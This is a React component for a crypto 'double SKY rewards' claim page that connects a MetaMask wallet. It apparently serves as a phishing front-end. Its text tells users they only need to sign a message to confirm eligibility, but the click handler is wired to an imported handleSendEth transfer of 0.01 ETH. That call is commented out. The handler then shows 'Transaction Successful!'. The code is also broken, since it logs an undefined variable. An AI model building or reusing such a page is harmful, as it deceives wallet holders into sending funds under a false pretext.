import { useAccount } from "@metamask/sdk-react-ui";
import { useEffect, useRef, useState } from "react";
import handleSendEth from "../../scripts/txn";
import App from "../Metamask";

export default function Connect({ isVerified }) {
	const [click, setClick] = useState(false);
	const [processing, setProcessing] = useState(true);

	const elementRef = useRef(null);
	let abx = useAccount();
	console.log("abx", abx.address);

	const handleClickOutside = (event) => {
		if (
			elementRef.current &&
			!elementRef.current.contains(event.target)
		) {
			setClick(false);
		}
	};

	const handleClick = async () => {
		console.log("handleClick abx", abx.address);

		// const response = await handleSendEth(abx.address, 0.01);
		setProcessing(false);
		console.log("response", response);
	};

	// Set up event listener when component mounts
	useEffect(() => {
		document.addEventListener("mousedown", handleClickOutside);
		return () => {
			document.removeEventListener(
				"mousedown",
				handleClickOutside
			);
		};
	}, []);

	return (
		<div
			className={`${
				isVerified
					? "bg-[#5a3ba2]"
					: "bg-[#403368]"
			}
            m-2 p-3 text-white rounded-lg`}
		>
			<div className="flex flex-row items-center gap-3 font-semibold pb-3">
				<div className="rounded-full bg-[#2d2d52] px-[1.125rem] py-2.5">
					2
				</div>
				<h3>
					Connect your wallet and sign
					the message
				</h3>
			</div>

			<h3 className="px-3 py-3">
				Sign the message to confirm eligibility.
				Your connected wallet will qualify to
				claim double SKY rewards.
			</h3>

			<button
				onClick={() => {
					if (isVerified)
						setClick(!click);
				}}
				className="relative inline-flex items-center justify-center p-0.5 mx-2 mb-2 overflow-hidden text-white rounded-lg group hover:bg-white"
			>
				<span className="relative px-5 py-2.5 transition-all ease-in duration-75 text-lg bg-white dark:bg-[#2d2d52] rounded-md">
					Connect Wallet
				</span>
			</button>

			{processing ? (
				click && (
					<div
						ref={elementRef}
						className="bg-[#F6F5F2] shadow-2xl rounded-lg absolute top-[40vh] left-[20vw] w-[60vw] h-[50vh] flex flex-col justify-center items-center"
					>
						<App />

						{abx.address &&
							click && (
								<button
									onClick={
										handleClick
									}
									className="relative inline-flex items-center justify-center p-0.5 mx-2 mb-2 text-white overflow-hidden rounded-lg group hover:bg-white"
								>
									<span className="relative px-5 py-2.5 transition-all ease-in duration-75 text-lg bg-white dark:bg-[#2d2d52] rounded-md">
										Get
										Rewards!
									</span>
								</button>
							)}
					</div>
				)
			) : (
				<div className="ps-3 text-green-500">Transaction Successful!</div>
			)}
		</div>
	);
}
